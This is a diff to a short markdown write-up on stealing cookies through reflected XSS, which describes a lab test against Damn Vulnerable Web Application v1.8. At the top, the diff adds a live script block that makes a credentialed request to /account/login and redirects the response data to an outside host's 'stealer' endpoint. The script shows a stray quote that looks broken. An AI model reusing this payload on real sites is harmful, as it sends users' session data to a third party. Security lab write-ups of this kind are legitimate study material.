@@ -1,5 +1,22 @@
 # Steal Cookies with Reflected XSS
 
+<script>
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() { if (xhr.readyState == 4)
+ 
+{
+   prompt('You are hacked , your session='+xhr.response);}
+   document.location.replace('//yassergersy.com/stealer?data='+xhr.response');
+}
+xhr.open('POST', '/account/login',true);
+xhr.withCredentials = true;
+xhr.send(null);
+</script>
+
+##
+##
+##
+
 This is a basic Reflected XSS attack to steal cookies from a user of a vulnerable website. The attack string comes from Ch. 12, p. 436 of [The Web Application Hacker's Handbook, 2nd Ed.][3]
 
 This was tested against the [Damn Vulnerable Web Application][5] (DVWA) v1.8. DVWA can be installed alone or as part of the excellent [OWASP Broken Web Applications Project][6] (BWA) v1.2.
